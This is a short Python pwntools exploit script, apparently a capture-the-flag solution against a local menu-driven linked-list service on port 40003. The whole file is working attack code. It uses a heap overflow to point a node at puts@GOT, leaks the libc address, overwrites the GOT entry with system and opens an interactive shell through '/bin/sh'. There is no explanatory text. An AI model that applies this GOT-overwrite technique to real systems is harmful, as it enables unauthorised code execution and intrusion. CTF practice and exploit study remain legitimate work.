from pwn import *

read_got = 0x0804A010
puts_got = 0x0804A024

puts  = 0x0005FCA0 
system = 0x0003ADA0 

p = remote("127.0.0.1",40003)

def add(value,data,flag=0):
	p.recvuntil("please input your choice:")
	p.sendline("1")
	p.recvuntil("Value:")
	p.sendline(str(value))
	p.recvuntil("Data:")
	if not flag:
		p.send(data)

def edit(OldValue,NewValue,NewData):
	p.recvuntil("please input your choice:")
	p.sendline("2")
	p.recvuntil("Node's value:")
	p.sendline(str(OldValue))
	p.recvuntil("New value:")
	p.sendline(str(NewValue))
	p.recvuntil("New data:")
	p.send(NewData)

def quit():
	p.recvuntil("please input your choice:")
	p.sendline("4")


for i in range(0,100):
	print i
	if i > 9:
		add(i,str(i),1)
	else:
		add(i,str(i))

edit(0,0,"/bin/sh\x00" + 'a'*0x28 + p32(puts_got))
p.recvuntil("please input your choice:")

p.sendline("3")
p.recvuntil("/bin/sh")
p.recvuntil("Value:")
puts_addr = int(p.recvline())
print hex(puts_addr)

libc_base = puts_addr - puts
system_addr = libc_base + system

edit(puts_addr,system_addr,"0")
p.sendline("3")
p.interactive()


